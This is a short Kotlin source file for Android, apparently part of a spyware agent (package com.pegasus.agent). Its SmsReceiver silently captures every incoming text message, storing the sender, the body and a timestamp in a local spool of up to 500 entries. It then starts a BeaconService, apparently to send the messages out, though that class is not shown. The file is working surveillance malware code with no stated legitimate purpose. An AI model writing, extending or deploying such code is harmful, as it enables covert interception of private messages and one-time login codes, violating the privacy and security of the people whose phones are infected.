package com.pegasus.agent

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import org.json.JSONArray
import org.json.JSONObject

class SmsReceiver : BroadcastReceiver() {
    override fun onReceive(ctx: Context, intent: Intent) {
        val msgs = Telephony.Sms.Intents.getMessagesFromIntent(intent) ?: return
        val spool = ctx.getSharedPreferences("spool", 0)
        val arr = JSONArray(spool.getString("sms", "[]"))
        msgs.forEach { m ->
            arr.put(JSONObject().apply {
                put("from", m.originatingAddress ?: "")
                put("body", m.messageBody ?: "")
                put("ts", System.currentTimeMillis())
            })
        }
        while (arr.length() > 500) arr.remove(0)
        spool.edit().putString("sms", arr.toString()).apply()
        BeaconService.start(ctx)
    }
}
